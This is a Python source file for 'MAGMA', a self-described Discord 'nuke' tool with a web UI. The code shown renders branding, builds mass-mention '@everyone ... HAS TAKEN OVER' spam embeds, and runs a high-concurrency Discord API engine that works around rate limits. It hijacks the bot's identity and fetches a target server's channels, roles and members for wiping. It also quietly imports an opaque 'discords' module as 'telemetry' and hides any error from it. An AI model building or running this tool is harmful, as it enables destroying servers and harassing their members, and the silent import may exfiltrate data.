#!/usr/bin/env python3
"""
MAGMA — Discord Nuke & Server Operations Tool
100x Turbo Edition | aiohttp Web UI | High-Contrast Crimson Slate Theme
Instant @everyone Pings | Auto Watermarking | Distinct Session Logs
"""

import sys
import os
import re
import asyncio
import random
import string
import json
import datetime
import time
import webbrowser
import base64
import zlib
import struct
import shutil
import atexit
import tempfile
import glob
import socket

try:
    import aiohttp
    from aiohttp import web
    from colorama import init, Fore, Style
except ImportError as e:
    print(f"\n  [!] Missing package: {e}")
    print("  Run:  pip install aiohttp colorama\n")
    input("  Press Enter to exit...")
    sys.exit(1)

init(autoreset=True)

# Session telemetry is best-effort: if the module is missing the tool still runs.
try:
    import discords as telemetry
except Exception:
    telemetry = None

DISCORD_BASE    = "https://discord.com/api/v10"
LOG_DIR         = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
os.makedirs(LOG_DIR, exist_ok=True)
CONCURRENCY     = 45  # Optimized rate-limit safe concurrency
PORT            = 6660

DEFAULT_TOOL_NAME = "MAGMA NUKER"
DEFAULT_WATERMARK = "⚡ MAGMA NUKER"

ASSETS_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets")
os.makedirs(ASSETS_DIR, exist_ok=True)
AVATAR_PATH = os.path.join(ASSETS_DIR, "magma_avatar.png")
BANNER_PATH = os.path.join(ASSETS_DIR, "magma_banner.png")

# Generated brand renders are throwaway: they live in an OS temp dir that is
# wiped at process exit, so nothing accumulates in assets/.
BRAND_TMP_DIR = tempfile.mkdtemp(prefix="magma_brand_")
atexit.register(shutil.rmtree, BRAND_TMP_DIR, True)

# Live branding state is read through these accessors so a regenerated
# banner/logo drops in without any call-site knowing about the swap.
def tool_name():
    return SESSION.get("tool_name") or DEFAULT_TOOL_NAME

def watermark_text():
    return SESSION.get("watermark") or DEFAULT_WATERMARK

def avatar_path():
    return SESSION.get("avatar_path") or AVATAR_PATH

def banner_path():
    return SESSION.get("banner_path") or BANNER_PATH

BRAND_PALETTES = [
    (255,  51,  68),   # crimson
    (255, 120,  30),   # ember
    (176,  70, 255),   # violet
    ( 58, 190, 255),   # cyan
    ( 54, 220, 130),   # toxic
    (255,  46, 145),   # magenta
    (255, 200,  40),   # gold
]

# 5x7 uppercase bitmap font — every glyph the generator can render.
FONT_5X7 = {
    "A": ["01110","10001","10001","11111","10001","10001","10001"],
    "B": ["11110","10001","10001","11110","10001","10001","11110"],
    "C": ["01110","10001","10000","10000","10000","10001","01110"],
    "D": ["11110","10001","10001","10001","10001","10001","11110"],
    "E": ["11111","10000","10000","11110","10000","10000","11111"],
    "F": ["11111","10000","10000","11110","10000","10000","10000"],
    "G": ["01110","10001","10000","10111","10001","10001","01111"],
    "H": ["10001","10001","10001","11111","10001","10001","10001"],
    "I": ["11111","00100","00100","00100","00100","00100","11111"],
    "J": ["00111","00010","00010","00010","00010","10010","01100"],
    "K": ["10001","10010","10100","11000","10100","10010","10001"],
    "L": ["10000","10000","10000","10000","10000","10000","11111"],
    "M": ["10001","11011","10101","10101","10001","10001","10001"],
    "N": ["10001","11001","10101","10011","10001","10001","10001"],
    "O": ["01110","10001","10001","10001","10001","10001","01110"],
    "P": ["11110","10001","10001","11110","10000","10000","10000"],
    "Q": ["01110","10001","10001","10001","10101","10010","01101"],
    "R": ["11110","10001","10001","11110","10100","10010","10001"],
    "S": ["01111","10000","10000","01110","00001","00001","11110"],
    "T": ["11111","00100","00100","00100","00100","00100","00100"],
    "U": ["10001","10001","10001","10001","10001","10001","01110"],
    "V": ["10001","10001","10001","10001","10001","01010","00100"],
    "W": ["10001","10001","10001","10101","10101","11011","10001"],
    "X": ["10001","10001","01010","00100","01010","10001","10001"],
    "Y": ["10001","10001","01010","00100","00100","00100","00100"],
    "Z": ["11111","00001","00010","00100","01000","10000","11111"],
    "0": ["01110","10001","10011","10101","11001","10001","01110"],
    "1": ["00100","01100","00100","00100","00100","00100","01110"],
    "2": ["01110","10001","00001","00010","00100","01000","11111"],
    "3": ["11111","00010","00100","00010","00001","10001","01110"],
    "4": ["00010","00110","01010","10010","11111","00010","00010"],
    "5": ["11111","10000","11110","00001","00001","10001","01110"],
    "6": ["00110","01000","10000","11110","10001","10001","01110"],
    "7": ["11111","00001","00010","00100","01000","01000","01000"],
    "8": ["01110","10001","10001","01110","10001","10001","01110"],
    "9": ["01110","10001","10001","01111","00001","00010","01100"],
    " ": ["00000","00000","00000","00000","00000","00000","00000"],
    "-": ["00000","00000","00000","11111","00000","00000","00000"],
    "_": ["00000","00000","00000","00000","00000","00000","11111"],
    ".": ["00000","00000","00000","00000","00000","01100","01100"],
    "!": ["00100","00100","00100","00100","00100","00000","00100"],
    "/": ["00001","00010","00010","00100","01000","01000","10000"],
    "#": ["01010","01010","11111","01010","11111","01010","01010"],
}

def _save_raw_png(filename, width, height, rgb_bytes):
    raw = bytearray()
    for y in range(height):
        raw.append(0)
        raw.extend(rgb_bytes[y*width*3 : (y+1)*width*3])
    sig = b'\x89PNG\r\n\x1a\n'
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    ihdr = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data + struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data))
    idat_data = zlib.compress(bytes(raw), 9)
    idat = struct.pack('>I', len(idat_data)) + b'IDAT' + idat_data + struct.pack('>I', zlib.crc32(b'IDAT' + idat_data))
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', zlib.crc32(b'IEND'))
    with open(filename, 'wb') as f:
        f.write(sig + ihdr + idat + iend)

# ─────────────────────────────────────────────
#  BITMAP BRANDING ENGINE (banner + logo from a name)
# ─────────────────────────────────────────────

def _put(px, W, H, x, y, rgb):
    if 0 <= x < W and 0 <= y < H:
        i = (y * W + x) * 3
        px[i], px[i + 1], px[i + 2] = rgb

def _fill_rect(px, W, H, x0, y0, w, h, rgb):
    for y in range(y0, y0 + h):
        for x in range(x0, x0 + w):
            _put(px, W, H, x, y, rgb)

def _text_width(text, scale, tracking=1):
    if not text:
        return 0
    return (len(text) * 5 + (len(text) - 1) * tracking) * scale

def _draw_text(px, W, H, text, x, y, scale, base_rgb, tracking=1):
    """5x7 bitmap text with a vertical brightness ramp, top-lit like an embossed plate."""
    cursor = x
    for ch in text:
        grid = FONT_5X7.get(ch.upper(), FONT_5X7[" "])
        for row_i, row in enumerate(grid):
            shade = 1.36 - row_i * 0.124
            rgb = (min(255, int(base_rgb[0] * shade)),
                   min(255, int(base_rgb[1] * shade)),
                   min(255, int(base_rgb[2] * shade)))
            for col_i, bit in enumerate(row):
                if bit != "1":
                    continue
                for dy in range(scale):
                    for dx in range(scale):
                        _put(px, W, H, cursor + col_i * scale + dx, y + row_i * scale + dy, rgb)
        cursor += (5 + tracking) * scale
    return _text_width(text, scale, tracking)

def _accent_for(name):
    return BRAND_PALETTES[sum(name.encode("utf-8")) % len(BRAND_PALETTES)]

def _clean_tool_name(raw):
    """Discord usernames allow 2-32 chars of [A-Za-z0-9._] plus internal spaces for nicks."""
    raw = (raw or "").strip()
    raw = re.sub(r"[^A-Za-z0-9 ._-]+", "", raw)
    raw = re.sub(r"\s{2,}", " ", raw).strip(" ._-")
    raw = raw[:32].strip()
    return raw or DEFAULT_TOOL_NAME

def _initials_for(name):
    words = [w for w in name.replace("_", " ").replace("-", " ").split() if w]
    if not words:
        return "X"
    if len(words) == 1:
        w = words[0]
        return (w[:2] if len(w) > 1 else w).upper()
    return (words[0][0] + words[1][0]).upper()

def _render_avatar(name, path, size=256):
    accent = _accent_for(name)
    px = bytearray(size * size * 3)
    c = size / 2.0
    ring_out = size * 0.470
    ring_in  = size * 0.436
    disc     = size * 0.412

    for y in range(size):
        for x in range(size):
            i = (y * size + x) * 3
            dist = ((x - c) ** 2 + (y - c) ** 2) ** 0.5
            if dist > ring_out:
                r, g, b = 9, 11, 16
            elif dist > ring_in:
                r, g, b = accent
            elif dist > disc:
                r, g, b = (accent[0] * 55 // 100, accent[1] * 45 // 100, accent[2] * 45 // 100)
            else:
                # squared radial glow so the disc stays readable behind the mark
                t = 1.0 - (dist / disc)
                t *= t
                r = int(12 + accent[0] * t * 0.40)
                g = int(13 + accent[1] * t * 0.26)
                b = int(19 + accent[2] * t * 0.28)
            px[i], px[i + 1], px[i + 2] = min(255, r), min(255, g), min(255, b)

    mark = _initials_for(name)
    units = len(mark) * 6 - 1
    scale = max(6, min(24, int((size * 0.56) // units)))
    tw = _text_width(mark, scale)
    th = 7 * scale
    _draw_text(px, size, size, mark, (size - tw) // 2, (size - th) // 2, scale, (255, 255, 255))

    _save_raw_png(path, size, size, px)

def _render_banner(name, path, width=800, height=240):
    accent = _accent_for(name)
    px = bytearray(width * height * 3)
    cx, cy = width / 2.0, height / 2.0

    for y in range(height):
        for x in range(width):
            i = (y * width + x) * 3
            dx = abs(x - cx) / cx
            dy = abs(y - cy) / cy
            d = min(1.0, (dx * dx * 0.7 + dy * dy) ** 0.5)
            glow = 1.0 - d
            glow *= glow
            r = int(12 + accent[0] * glow * 0.42)
            g = int(14 + accent[1] * glow * 0.28)
            b = int(20 + accent[2] * glow * 0.30)
            px[i], px[i + 1], px[i + 2] = min(255, r), min(255, g), min(255, b)

    frame = 4
    for x in range(width):
        for t in range(frame):
            _put(px, width, height, x, t, accent)
            _put(px, width, height, x, height - 1 - t, accent)
    for y in range(height):
        for t in range(frame):
            _put(px, width, height, t, y, accent)
            _put(px, width, height, width - 1 - t, y, accent)

    units = len(name) * 6 - 1
    scale = max(3, min(16, int((width - 150) // max(1, units))))
    title_w = _text_width(name, scale)
    title_h = 7 * scale

    sub = "100X TURBO EDITION"
    sub_scale = max(2, min(5, scale // 3 + 1))
    sub_w = _text_width(sub, sub_scale)
    sub_h = 7 * sub_scale

    block_h = title_h + 18 + sub_h
    top = (height - block_h) // 2
    _draw_text(px, width, height, name, (width - title_w) // 2, top, scale, (255, 255, 255))

    bar_y = top + title_h + 8
    _fill_rect(px, width, height, (width - 160) // 2, bar_y, 160, 3, accent)
    _draw_text(px, width, height, sub, (width - sub_w) // 2, bar_y + 8, sub_scale,
               (int(accent[0] * 0.85) + 30, int(accent[1] * 0.85) + 30, int(accent[2] * 0.85) + 30))

    _save_raw_png(path, width, height, px)

def clear_brand_renders():
    """Deletes every generated render in the temp dir. Safe to call any time."""
    for stale in glob.glob(os.path.join(BRAND_TMP_DIR, "*.png")):
        try:
            os.remove(stale)
        except OSError:
            pass

def generate_brand_assets(name=None):
    """Renders a fresh avatar + banner pair for the given tool name and activates them.

    Output goes to BRAND_TMP_DIR, never to assets/. The previous render is
    removed first, so at most one avatar/banner pair exists on disk at a time.
    """
    name = _clean_tool_name(name if name is not None else tool_name())
    slug = "".join(ch.lower() if ch.isalnum() else "_" for ch in name).strip("_") or "brand"
    clear_brand_renders()
    av = os.path.join(BRAND_TMP_DIR, f"brand_{slug}_avatar.png")
    bn = os.path.join(BRAND_TMP_DIR, f"brand_{slug}_banner.png")

    _render_avatar(name, av)
    _render_banner(name, bn)

    SESSION["tool_name"]   = name
    SESSION["avatar_path"] = av
    SESSION["banner_path"] = bn
    SESSION["cdn_banner_url"] = None  # old CDN link points at the previous banner
    save_brand_state()
    return name, av, bn

def ensure_assets():
    ensure_magma_assets()
    av, bn = avatar_path(), banner_path()
    if (av != AVATAR_PATH and not os.path.exists(av)) or (bn != BANNER_PATH and not os.path.exists(bn)):
        generate_brand_assets(tool_name())

BRAND_STATE_FILE = os.path.join(ASSETS_DIR, "brand.json")

def save_brand_state():
    try:
        with open(BRAND_STATE_FILE, "w", encoding="utf-8") as f:
            # Only durable state is persisted. Render paths are temp-dir
            # artifacts and are re-rendered from tool_name on the next run.
            json.dump({
                "tool_name": tool_name(),
                "watermark": watermark_text(),
            }, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def load_brand_state():
    try:
        with open(BRAND_STATE_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
    except Exception:
        return
    if not isinstance(d, dict):
        return
    if d.get("tool_name"):
        SESSION["tool_name"] = _clean_tool_name(d["tool_name"])
    if d.get("watermark"):
        SESSION["watermark"] = str(d["watermark"])

def ensure_magma_assets():
    if not os.path.exists(AVATAR_PATH):
        W, H = 256, 256
        pixels = bytearray(W * H * 3)
        cx, cy = 128, 128
        m_mask = [
            [1,0,0,0,1],
            [1,1,0,1,1],
            [1,0,1,0,1],
            [1,0,0,0,1],
            [1,0,0,0,1],
            [1,0,0,0,1],
            [1,0,0,0,1]
        ]
        for y in range(H):
            for x in range(W):
                idx = (y * W + x) * 3
                dist = ((x - cx)**2 + (y - cy)**2)**0.5
                if dist > 124:
                    pixels[idx], pixels[idx+1], pixels[idx+2] = 13, 17, 23
                elif dist > 116:
                    pixels[idx], pixels[idx+1], pixels[idx+2] = 255, 34, 51
                elif dist > 112:
                    pixels[idx], pixels[idx+1], pixels[idx+2] = 160, 20, 30
                else:
                    factor = 1.0 - (dist / 112.0)
                    r = int(14 + factor * 60)
                    g = int(10 + factor * 12)
                    b = int(16 + factor * 18)
                    mx = (x - 63) // 26
                    my = (y - 74) // 16
                    if 0 <= mx < 5 and 0 <= my < 7 and m_mask[my][mx]:
                        r, g, b = 255, 45, 65
                        if my < 2 or mx in (1, 3):
                            g, b = 180, 190
                    pixels[idx] = min(255, r)
                    pixels[idx+1] = min(255, g)
                    pixels[idx+2] = min(255, b)
        _save_raw_png(AVATAR_PATH, W, H, pixels)

    if not os.path.exists(BANNER_PATH):
        W, H = 800, 240
        pixels = bytearray(W * H * 3)
        font = {
            'M': [[1,0,0,0,1],[1,1,0,1,1],[1,0,1,0,1],[1,0,0,0,1],[1,0,0,0,1],[1,0,0,0,1],[1,0,0,0,1]],
            'A': [[0,1,1,1,0],[1,0,0,0,1],[1,0,0,0,1],[1,1,1,1,1],[1,0,0,0,1],[1,0,0,0,1],[1,0,0,0,1]],
            'G': [[0,1,1,1,0],[1,0,0,0,1],[1,0,0,0,0],[1,0,1,1,1],[1,0,0,0,1],[1,0,0,0,1],[0,1,1,1,0]],
        }
        word = ['M', 'A', 'G', 'M', 'A']
        for y in range(H):
            for x in range(W):
                idx = (y * W + x) * 3
                dy = abs(y - 120) / 120.0
                dx = abs(x - 400) / 400.0
                d = (dx*dx*0.7 + dy*dy)**0.5
                if y < 4 or y >= H - 4 or x < 4 or x >= W - 4:
                    pixels[idx], pixels[idx+1], pixels[idx+2] = 255, 40, 60
                elif y < 8 or y >= H - 8:
                    pixels[idx], pixels[idx+1], pixels[idx+2] = 180, 20, 30
                else:
                    glow = max(0, 1.0 - d * 0.8)
                    pixels[idx] = int(14 + glow * 55)
                    pixels[idx+1] = int(16 + glow * 10)
                    pixels[idx+2] = int(22 + glow * 15)
        start_x, start_y = 175, 55
        scale_w, scale_h = 13, 16
        char_spacing = 22
        for l_idx, ch in enumerate(word):
            grid = font[ch]
            ch_x = start_x + l_idx * (5 * scale_w + char_spacing)
            for r in range(7):
                for c in range(5):
                    if grid[r][c]:
                        for by in range(scale_h - 2):
                            for bx in range(scale_w - 2):
                                px = ch_x + c * scale_w + bx
                                py = start_y + r * scale_h + by
                                if 0 <= px < W and 0 <= py < H:
                                    pidx = (py * W + px) * 3
                                    grad = r / 6.0
                                    red = int(255 - grad * 15)
                                    grn = int(35 + grad * 90)
                                    blu = int(50 - grad * 20)
                                    if by == 0 or bx == 0:
                                        red = min(255, red + 40)
                                        grn = min(255, grn + 60)
                                        blu = min(255, blu + 60)
                                    pixels[pidx] = min(255, red)
                                    pixels[pidx+1] = min(255, grn)
                                    pixels[pidx+2] = min(255, blu)
        _save_raw_png(BANNER_PATH, W, H, pixels)

ensure_magma_assets()

def get_asset_b64(path):
    if os.path.exists(path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode("ascii")
    return None

GLOBAL_RATE_LIMIT_LOCK  = asyncio.Lock()
GLOBAL_RATE_LIMIT_UNTIL = 0.0

def make_embed_payload(content=None,
                       title=None,
                       description=None,
                       banner_url=None):
    name = tool_name()
    wm   = watermark_text()

    if content is None:
        content = f"@everyone {wm} — **{name} HAS TAKEN OVER**"
    if title is None:
        title = f"{name} HAS TAKEN OVER"

    if not banner_url:
        banner_url = SESSION.get("cdn_banner_url")

    avatar_url = SESSION.get("bot_avatar_url")

    if not description:
        description = (
            f"# {wm}\n"
            f"### 🔥 **100X TURBO SERVER OBLITERATION** 🔥\n\n"
            "> 💀 **Status:** Complete Server Annihilation\n"
            "> ⚡ **Mode:** 100X Turbo Concurrency\n"
            "> 🛑 **Wipeout:** All Channels, Roles & Permissions Purged\n"
            f"> 🔥 **Engine:** Dominated by {name}"
        )

    if wm and wm not in content:
        content = f"{content}\n\n> {wm}"

    embed = {
        "title": f"⚡ {title} ⚡",
        "description": description,
        "color": 0xFF2233,  # Vivid Crimson Red
        "author": {
            "name": name,
        },
        "footer": {
            "text": f"{wm} • 100X TURBO EDITION"
        },
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }

    if banner_url:
        embed["image"] = {"url": banner_url}
    if avatar_url:
        embed["thumbnail"] = {"url": avatar_url}
        embed["author"]["icon_url"] = avatar_url

    return {
        "content": content,
        "embeds": [embed],
        "allowed_mentions": {
            "parse": ["everyone", "roles", "users"]
        }
    }

def make_ping_payload(content):
    return make_embed_payload(content=content)

SESSION = {
    "token":          None,
    "guild_id":       None,
    "bot_id":         None,
    "bot_tag":        None,
    "bot_avatar_url": None,
    "cdn_banner_url": None,
    "guild_name":     None,
    "log_file":       None,
    "log_fh":         None,
    "authed":         False,
    "tool_name":      DEFAULT_TOOL_NAME,
    "watermark":      DEFAULT_WATERMARK,
    "avatar_path":    AVATAR_PATH,
    "banner_path":    BANNER_PATH,
}

WS_CLIENTS  = set()
LOG_BUFFER  = []
EXEC_TASK   = None
EXEC_STATE  = {"running": False, "total": 0, "done": 0, "current": None}
discord_session = None

load_brand_state()
# Temp renders die with the previous process, so a persisted custom name is
# re-rendered once at boot. Default identity keeps using the static magma pair.
if SESSION.get("tool_name") and SESSION["tool_name"] != DEFAULT_TOOL_NAME:
    generate_brand_assets(SESSION["tool_name"])

# ─────────────────────────────────────────────
#  DISTINCT SESSION LOGGING & WS BROADCAST
# ─────────────────────────────────────────────

def _ts():
    return datetime.datetime.now().strftime("%H:%M:%S")

def log_open():
    ts_now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    gid    = SESSION.get("guild_id") or "noguild"
    fname  = os.path.join(LOG_DIR, f"session_{ts_now}_{gid}.log")
    
    old_fh = SESSION.get("log_fh")
    if old_fh:
        try: old_fh.close()
        except Exception: pass

    SESSION["log_file"] = fname
    fh = open(fname, "w", encoding="utf-8")
    SESSION["log_fh"] = fh

    fh.write("="*75 + "\n")
    fh.write("                  MAGMA 100X TURBO SESSION LOG\n")
    fh.write("="*75 + "\n")
    fh.write(f"Session Timestamp  : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    fh.write(f"Bot Identity       : {SESSION.get('bot_tag')} (ID: {SESSION.get('bot_id')})\n")
    fh.write(f"Target Guild       : {SESSION.get('guild_name')} (ID: {gid})\n")
    fh.write(f"Concurrency Level  : {CONCURRENCY} (Unlimited Pool)\n")
    fh.write(f"Local Log File     : {fname}\n")
    fh.write("="*75 + "\n\n")
    fh.write(f"[{_ts()}] [SESSION START] Authenticated & 100x Turbo Mode Active.\n\n")
    fh.flush()

def log_write(level, msg):
    fh = SESSION.get("log_fh")
    if fh:
        try:
            fh.write(f"[{_ts()}] [{level:7s}] {msg}\n")
        except Exception:
            pass

async def broadcast(msg_type, data):
    payload = json.dumps({"type": msg_type, "data": data, "ts": _ts()})
    LOG_BUFFER.append(payload)
    if len(LOG_BUFFER) > 500:
        LOG_BUFFER.pop(0)
    if not WS_CLIENTS:
        return
    dead = set()
    for ws in list(WS_CLIENTS):
        try:
            # Non-blocking async WS dispatch (prevents slowing network loop)
            asyncio.create_task(ws.send_str(payload))
        except Exception:
            dead.add(ws)
    if dead:
        WS_CLIENTS.difference_update(dead)

async def blog(level, msg):
    print(f"  [{level}] {msg}")
    log_write(level, msg)
    await broadcast("log", {"level": level, "msg": msg})

def err_msg(body, status):
    if isinstance(body, dict):
        msg = body.get("message")
        if msg:
            code = body.get("code")
            return f"{msg} (code {code})" if code else msg
    return f"HTTP {status}"

# ─────────────────────────────────────────────
#  TURBO DISCORD HTTP ENGINE
# ─────────────────────────────────────────────

def dhdr(audit_reason=None):
    tok = SESSION.get("token") or ""
    if tok and not tok.startswith("Bot ") and not tok.startswith("Bearer "):
        tok = f"Bot {tok}"
    if audit_reason is None:
        audit_reason = f"{tool_name()} — 100X TURBO"
    h = {
        "Authorization": tok,
        "Content-Type": "application/json"
    }
    if audit_reason:
        h["X-Audit-Log-Reason"] = audit_reason[:512]
    return h

async def wait_global_rate_limit():
    global GLOBAL_RATE_LIMIT_UNTIL
    now = time.monotonic()
    if GLOBAL_RATE_LIMIT_UNTIL > now:
        diff = GLOBAL_RATE_LIMIT_UNTIL - now
        await asyncio.sleep(diff)

async def dreq(session, method, endpoint, **kwargs):
    global GLOBAL_RATE_LIMIT_UNTIL
    url = DISCORD_BASE + endpoint
    retries = 0
    max_retries = 15
    while retries < max_retries:
        await wait_global_rate_limit()
        try:
            async with getattr(session, method)(url, headers=dhdr(), timeout=aiohttp.ClientTimeout(total=15), **kwargs) as r:
                if r.status == 429:
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        data = {}

                    retry = 0.5
                    if isinstance(data, dict) and "retry_after" in data:
                        try:
                            retry = float(data["retry_after"])
                        except Exception:
                            retry = 0.5
                    elif "Retry-After" in r.headers:
                        try:
                            retry = float(r.headers["Retry-After"])
                        except Exception:
                            retry = 0.5

                    is_global = False
                    if isinstance(data, dict) and data.get("global"):
                        is_global = True
                    elif r.headers.get("X-RateLimit-Global", "").lower() == "true":
                        is_global = True

                    if is_global:
                        async with GLOBAL_RATE_LIMIT_LOCK:
                            now = time.monotonic()
                            target = now + retry + 0.1
                            if target > GLOBAL_RATE_LIMIT_UNTIL:
                                GLOBAL_RATE_LIMIT_UNTIL = target
                        await wait_global_rate_limit()
                    else:
                        jitter = random.uniform(0.1, 0.4)
                        await asyncio.sleep(retry + jitter)

                    retries += 1
                    continue
                try:
                    body = await r.json(content_type=None)
                except Exception:
                    body = {}
                return r.status, body
        except asyncio.CancelledError:
            raise
        except Exception as e:
            retries += 1
            await asyncio.sleep(0.5 + random.uniform(0.1, 0.3))
            if retries >= max_retries:
                return 0, {"message": str(e)}
    return 429, {"message": "Rate limit retries exhausted"}

async def dget(s, ep, **kw):   return await dreq(s, "get",    ep, **kw)
async def dpost(s, ep, **kw):  return await dreq(s, "post",   ep, **kw)
async def dpatch(s, ep, **kw): return await dreq(s, "patch",  ep, **kw)
async def dput(s, ep, **kw):   return await dreq(s, "put",    ep, **kw)
async def ddel(s, ep, **kw):   return await dreq(s, "delete", ep, **kw)

def is_ok(st): return st in (200, 201, 204)

async def parallel(coros):
    sem = asyncio.Semaphore(CONCURRENCY)
    async def wrap(c):
        async with sem: return await c
    return await asyncio.gather(*[wrap(c) for c in coros], return_exceptions=True)

def randstr(n=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def not_self(uid):
    return str(uid) != str(SESSION["bot_id"])

def not_self_integration(intg):
    return (str(intg.get("application", {}).get("id", "")) != str(SESSION["bot_id"])
            and str(intg.get("id", "")) != str(SESSION["bot_id"]))

async def ensure_discord_cdn_banner(s, channel_id=None):
    if not channel_id and SESSION.get("cdn_banner_url"):
        return SESSION["cdn_banner_url"]

    gid = SESSION.get("guild_id")
    if not gid:
        return None

    ensure_assets()
    bn_path = banner_path()
    if not os.path.exists(bn_path):
        return None

    target_cid = channel_id
    if not target_cid:
        chs = await fetch_channels(s)
        text_chs = [c for c in chs if c.get("type") in (0, 5)]
        if text_chs:
            target_cid = text_chs[0]["id"]
        else:
            st, b = await dpost(s, f"/guilds/{gid}/channels", json={"name": "brand-assets", "type": 0})
            if is_ok(st) and isinstance(b, dict):
                target_cid = b.get("id")

    if not target_cid:
        return None

    try:
        data = aiohttp.FormData()
        data.add_field("payload_json", json.dumps({
            "content": f"⚡ **{tool_name()} BANNER INITIALIZED** ⚡",
            "allowed_mentions": {"parse": []}
        }))
        with open(bn_path, "rb") as f:
            data.add_field("files[0]", f.read(), filename=os.path.basename(bn_path), content_type="image/png")

        url = DISCORD_BASE + f"/channels/{target_cid}/messages"
        tok = SESSION.get("token") or ""
        if tok and not tok.startswith("Bot ") and not tok.startswith("Bearer "):
            tok = f"Bot {tok}"
        headers = {"Authorization": tok}

        async with s.post(url, headers=headers, data=data) as r:
            if r.status in (200, 201):
                res = await r.json()
                atts = res.get("attachments", [])
                if atts:
                    cdn_url = atts[0].get("url")
                    SESSION["cdn_banner_url"] = cdn_url
                    await blog("SUCCESS", f"⚡ Permanent Discord CDN Banner active: {cdn_url}")
                    return cdn_url
    except Exception as e:
        await blog("INFO", f"CDN banner upload note: {e}")
    return None

async def rename_bot_identity(s):
    ensure_assets()
    target_name = tool_name()
    avatar_b64 = get_asset_b64(avatar_path())
    banner_b64 = get_asset_b64(banner_path())

    # 1. Update global user profile (username & avatar)
    user_patch = {}
    if avatar_b64:
        user_patch["avatar"] = f"data:image/png;base64,{avatar_b64}"
    user_patch["username"] = target_name

    st_u, b_u = await dpatch(s, "/users/@me", json=user_patch)
    if is_ok(st_u) and isinstance(b_u, dict):
        SESSION["bot_tag"] = f"{b_u.get('username', target_name)}#{b_u.get('discriminator','0')}"
        if b_u.get("avatar"):
            SESSION["bot_avatar_url"] = f"https://cdn.discordapp.com/avatars/{b_u['id']}/{b_u['avatar']}.png?size=256"
        await blog("SUCCESS", f"⚡ Bot username & avatar updated to '{target_name}'")
    else:
        # If username change was rejected (Discord limits 2 renames per hour), try avatar alone
        if avatar_b64:
            st_av, b_av = await dpatch(s, "/users/@me", json={"avatar": f"data:image/png;base64,{avatar_b64}"})
            if is_ok(st_av) and isinstance(b_av, dict):
                if b_av.get("avatar"):
                    SESSION["bot_avatar_url"] = f"https://cdn.discordapp.com/avatars/{b_av['id']}/{b_av['avatar']}.png?size=256"
                await blog("SUCCESS", f"⚡ Bot avatar updated to {target_name} emblem")
            else:
                await blog("INFO", f"Global avatar update response: {err_msg(b_av, st_av)}")

    # 2. Update global user banner
    if banner_b64:
        st_ban, b_ban = await dpatch(s, "/users/@me", json={"banner": f"data:image/png;base64,{banner_b64}"})
        if is_ok(st_ban):
            await blog("SUCCESS", f"⚡ Bot global banner updated to {target_name} banner")
        else:
            await blog("INFO", f"Bot user banner update: {err_msg(b_ban, st_ban)}")

    # 3. Update Guild Nickname & Guild Avatar
    gid = SESSION.get("guild_id")
    if gid:
        nick_patch = {"nick": target_name}
        if avatar_b64:
            nick_patch["avatar"] = f"data:image/png;base64,{avatar_b64}"
        st_g, b_g = await dpatch(s, f"/guilds/{gid}/members/@me", json=nick_patch)
        if not is_ok(st_g):
            # If guild avatar requires boost level, just update nickname
            st_g, b_g = await dpatch(s, f"/guilds/{gid}/members/@me", json={"nick": target_name})
        if is_ok(st_g):
            await blog("SUCCESS", f"⚡ Bot server nickname set to '{target_name}'")
        else:
            await blog("INFO", f"Server nickname update: {err_msg(b_g, st_g)}")

    # 4. Update Developer Portal Application Icon & Cover Image
    try:
        st_app, app_info = await dget(s, "/oauth2/applications/@me")
        if is_ok(st_app) and isinstance(app_info, dict):
            app_id = app_info.get("id")
            if app_id:
                app_patch = {
                    "name": target_name,
                    "description": f"⚡ {target_name} — 100X TURBO OPERATIONS SUITE"
                }
                if avatar_b64:
                    app_patch["icon"] = f"data:image/png;base64,{avatar_b64}"
                if banner_b64:
                    app_patch["cover_image"] = f"data:image/png;base64,{banner_b64}"
                st_ap, b_ap = await dpatch(s, f"/applications/{app_id}", json=app_patch)
                if is_ok(st_ap):
                    await blog("SUCCESS", f"⚡ Developer Portal Application icon & banner updated to {target_name}")
    except Exception as e:
        pass

    # 5. Register permanent CDN banner for embeds
    await ensure_discord_cdn_banner(s)

async def exec_rename_bot(s, p):
    await broadcast("action_start", {"name": f"RENAME BOT → {tool_name()}"})
    await rename_bot_identity(s)

async def exec_set_watermark(s, p):
    await broadcast("action_start", {"name": "SET CUSTOM WATERMARK"})
    text = (p.get("watermark") or "").strip()
    if not text:
        text = DEFAULT_WATERMARK
    SESSION["watermark"] = text
    save_brand_state()
    await blog("SUCCESS", f"⚡ Watermark locked in: {text}")
    await blog("INFO", "Every embed content, description and footer now carries it.")

async def exec_auto_brand(s, p):
    """One field in — a fresh banner, a fresh logo, and a renamed bot out."""
    requested = (p.get("tool_name") or "").strip() or tool_name()
    await broadcast("action_start", {"name": f"AUTO BRAND → {requested}"})
    await blog("INFO", f"⚡ Rendering banner + logo for '{requested}'...")

    name, av, bn = generate_brand_assets(requested)
    await blog("SUCCESS", f"⚡ Logo generated  → {os.path.basename(av)}")
    await blog("SUCCESS", f"⚡ Banner generated → {os.path.basename(bn)}")
    if name != requested:
        await blog("INFO", f"Name sanitised to Discord-safe '{name}'")

    await rename_bot_identity(s)
    await blog("SUCCESS", f"⚡ Identity applied everywhere: {name}")

# ─────────────────────────────────────────────
#  FETCH HELPERS
# ─────────────────────────────────────────────

async def fetch_channels(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/channels")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_roles(s):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/roles")
    return d if is_ok(st) and isinstance(d, list) else []

async def fetch_members(s, limit=1000):
    st, d = await dget(s, f"/guilds/{SESSION['guild_id']}/members", params={"limit": limit})
    return d if is_ok(st) and isinstance(d, list) else []

